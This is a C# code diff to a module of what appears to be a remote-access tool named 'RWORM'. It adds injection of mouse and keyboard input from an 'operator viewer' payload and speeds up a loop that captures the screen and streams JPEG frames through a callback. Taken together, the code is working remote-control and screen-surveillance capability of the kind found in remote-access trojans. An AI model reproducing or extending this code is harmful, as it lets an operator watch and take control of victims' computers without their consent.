@@ -21,8 +21,31 @@ namespace RWORM.Client.Modules
         [DllImport("user32.dll")]
         private static extern int GetSystemMetrics(int nIndex);
 
+        [DllImport("user32.dll")]
+        private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);
+
+        [DllImport("user32.dll")]
+        private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+
+        [DllImport("user32.dll")]
+        private static extern bool SetCursorPos(int X, int Y);
+
         private const int SM_CXSCREEN = 0;
         private const int SM_CYSCREEN = 1;
+
+        // mouse_event flags
+        private const uint MOUSEEVENTF_MOVE = 0x0001;
+        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
+        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
+        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
+        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
+        private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
+        private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
+        private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;
+
+        // keybd_event flags
+        private const uint KEYEVENTF_KEYDOWN = 0x0000;
+        private const uint KEYEVENTF_KEYUP = 0x0002;
 
         private delegate bool MonitorEnumDelegate(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);
 
@@ -59,11 +82,12 @@ namespace RWORM.Client.Modules
 
         private CancellationTokenSource? _cts;
         private bool _running;
+        private static readonly ImageCodecInfo JpegEncoder = FindJpegEncoder();
 
         public Func<byte[], Task>? OnFrame { get; set; }
-        public int Fps { get; set; } = 5;
+        public int Fps { get; set; } = 8;
         public int Quality { get; set; } = 40;
-        public int MonitorIndex { get; set; } = 0; // 0 = Display 1, etc. -1 = Virtual desktop (all monitors)
+        public int MonitorIndex { get; set; } = 0;
 
         public bool IsRunning => _running;
 
@@ -134,13 +158,78 @@ namespace RWORM.Client.Modules
             _cts?.Cancel();
         }
 
+        /// <summary>
+        /// Handles remote mouse/keyboard interaction payload from the operator viewer.
+        /// Payload format: "mouse\x00action\x00x\x00y\x00button" or "key\x00action\x00vk"
+        /// </summary>
+        public static void HandleInput(string payload)
+        {
+            try
+            {
+                var parts = payload.Split('\x00');
+                if (parts.Length < 2) return;
+
+                if (parts[0] == "mouse" && parts.Length >= 5)
+                {
+                    string action = parts[1];
+                    int targetX = int.Parse(parts[2]);
+                    int targetY = int.Parse(parts[3]);
+                    int button = int.Parse(parts[4]);
+
+                    SetCursorPos(targetX, targetY);
+
+                    switch (action)
+                    {
+                        case "move":
+                            // SetCursorPos is sufficient
+                            break;
+                        case "down":
+                            if (button == 1) mouse_event(MOUSEEVENTF_LEFTDOWN, targetX, targetY, 0, UIntPtr.Zero);
+                            else if (button == 2) mouse_event(MOUSEEVENTF_RIGHTDOWN, targetX, targetY, 0, UIntPtr.Zero);
+                            else if (button == 3) mouse_event(MOUSEEVENTF_MIDDLEDOWN, targetX, targetY, 0, UIntPtr.Zero);
+                            break;
+                        case "up":
+                            if (button == 1) mouse_event(MOUSEEVENTF_LEFTUP, targetX, targetY, 0, UIntPtr.Zero);
+                            else if (button == 2) mouse_event(MOUSEEVENTF_RIGHTUP, targetX, targetY, 0, UIntPtr.Zero);
+                            else if (button == 3) mouse_event(MOUSEEVENTF_MIDDLEUP, targetX, targetY, 0, UIntPtr.Zero);
+                            break;
+                        case "click":
+                            if (button == 1)
+                            {
+                                mouse_event(MOUSEEVENTF_LEFTDOWN, targetX, targetY, 0, UIntPtr.Zero);
+                                mouse_event(MOUSEEVENTF_LEFTUP, targetX, targetY, 0, UIntPtr.Zero);
+                            }
+                            else if (button == 2)
+                            {
+                                mouse_event(MOUSEEVENTF_RIGHTDOWN, targetX, targetY, 0, UIntPtr.Zero);
+                                mouse_event(MOUSEEVENTF_RIGHTUP, targetX, targetY, 0, UIntPtr.Zero);
+                            }
+                            break;
+                    }
+                }
+                else if (parts[0] == "key" && parts.Length >= 3)
+                {
+                    string action = parts[1];
+                    byte vk = byte.Parse(parts[2]);
+
+                    if (action == "down") keybd_event(vk, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
+                    else if (action == "up") keybd_event(vk, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
+                }
+            }
+            catch { }
+        }
+
         private async Task CaptureLoop()
         {
-            int interval = 1000 / Math.Max(1, Fps);
-            var enc = GetJpegEncoder();
+            var enc = JpegEncoder;
+            var ms = new MemoryStream(65536);
 
             while (_running && !(_cts?.IsCancellationRequested ?? true))
             {
+                var cycleStart = Environment.TickCount;
+                int currentFps = Math.Clamp(Fps, 1, 30);
+                int frameDelay = 1000 / currentFps;
+
                 try
                 {
                     var monitors = GetMonitors();
@@ -166,32 +255,46 @@ namespace RWORM.Client.Modules
                             g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
                         }
 
-                        byte[] frame;
-                        using (var ms = new MemoryStream())
+                        ms.SetLength(0);
                         using (var encParms = new EncoderParameters(1))
                         {
-                            encParms.Param[0] = new EncoderParameter(Encoder.Quality, (long)Quality);
+                            encParms.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Clamp(Quality, 10, 95));
                             bmp.Save(ms, enc, encParms);
-                            frame = ms.ToArray();
                         }
 
-                        if (OnFrame != null)
+                        byte[] frame = ms.ToArray();
+                        if (OnFrame != null && _running)
+                        {
                             await OnFrame(frame);
+                        }
                     }
                 }
                 catch { }
 
-                await Task.Delay(interval);
+                int elapsed = Environment.TickCount - cycleStart;
+                int sleep = frameDelay - elapsed;
+                if (sleep > 0)
+                {
+                    try { await Task.Delay(sleep, _cts?.Token ?? CancellationToken.None); } catch { break; }
+                }
             }
+
+            try { ms.Dispose(); } catch { }
         }
 
-        private static ImageCodecInfo GetJpegEncoder()
+        private static ImageCodecInfo FindJpegEncoder()
         {
             foreach (var c in ImageCodecInfo.GetImageEncoders())
+            {
                 if (c.FormatID == ImageFormat.Jpeg.Guid) return c;
+            }
             throw new NotSupportedException("JPEG encoder not found");
         }
 
-        public void Dispose() => Stop();
+        public void Dispose()
+        {
+            Stop();
+            _cts?.Dispose();
+        }
     }
 }
